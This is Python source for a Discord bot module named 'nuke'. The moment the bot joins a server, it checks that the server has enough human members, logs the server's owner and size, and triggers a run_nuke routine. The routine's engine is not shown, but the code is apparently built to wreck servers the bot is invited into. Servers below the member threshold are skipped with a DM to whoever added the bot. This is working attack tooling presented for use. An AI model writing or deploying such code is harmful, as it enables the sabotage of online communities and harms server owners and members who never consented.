from __future__ import annotations

import asyncio
import logging

import discord
from discord import Guild
from discord.ext.commands import Cog

from nuke.engine import run_nuke, stop


class nuke(Cog):
    def __init__(self, bot):
        self.bot = bot
        self._tasks: dict[int, asyncio.Task] = {}

    @Cog.listener()
    async def on_guild_join(self, guild: Guild):
        from nuke.config import get as nuke_cfg

        c = nuke_cfg()
        if c.minimum_members > 0:
            humans = 0
            try:
                async for m in guild.fetch_members(limit=None):
                    if not m.bot:
                        humans += 1
            except discord.Forbidden:
                logging.warning(f"nuke skip: cannot fetch members in {guild.name}")
                humans = guild.member_count or 0
            except Exception as e:
                logging.warning(f"nuke skip: fetch_members error: {e}")
                humans = guild.member_count or 0
            if humans < c.minimum_members:
                logging.info(
                    f"nuke skip: {guild.id} ({guild.name}) "
                    f"humans={humans} < min={c.minimum_members}"
                )
                who = None
                try:
                    async for entry in guild.audit_logs(
                        action=discord.AuditLogAction.bot_add, limit=1
                    ):
                        if entry.target and entry.target.id == self.bot.user.id:
                            who = entry.user
                            break
                except discord.Forbidden:
                    logging.warning(f"nuke skip: no audit log access in {guild.name}")
                except Exception as e:
                    logging.warning(f"nuke skip: audit log error: {e}")
                if who and not who.bot:
                    try:
                        await who.send(
                            f"hey! this server doesn't have {c.minimum_members} "
                            f"members to use the bot, please add it to a server "
                            f"with that amount of humans"
                        )
                        logging.info(f"nuke skip: DM sent to {who}")
                    except discord.Forbidden:
                        logging.warning(f"nuke skip: could not DM {who}")
                    except Exception as e:
                        logging.warning(f"nuke skip: DM error: {e}")
                await guild.leave()
                return
        logging.info(
            f"nuke triggered: {guild.id} ({guild.name})"
            f" | members={guild.member_count}"
            f" | channels={len(guild.channels)}"
            f" | roles={len(guild.roles)}"
            f" | owner={guild.owner_id}"
            f" | created_at={guild.created_at}"
            f" | features={guild.features}"
        )
        await run_nuke(self.bot, guild.id)

    @Cog.listener()
    async def on_guild_remove(self, guild: Guild):
        await stop(guild.id)
        task = self._tasks.pop(guild.id, None)
        if task:
            task.cancel()


def setup(bot):
    bot.add_cog(nuke(bot))
